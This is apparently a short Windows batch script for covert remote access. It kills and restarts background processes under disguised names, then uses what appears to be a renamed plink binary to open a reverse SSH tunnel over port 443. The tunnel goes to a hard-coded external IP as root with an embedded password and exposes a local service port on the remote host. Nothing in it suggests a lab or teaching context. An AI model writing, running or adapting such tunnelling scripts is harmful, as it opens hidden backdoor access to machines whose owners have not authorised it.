taskkill /f /im:winpl.exe
taskkill /f /im:goso.exe
start /b goso
echo y | winpl.exe -pw server root@51.77.107.137 -P 443 -R 0.0.0.0:3399:127.0.0.1:3391
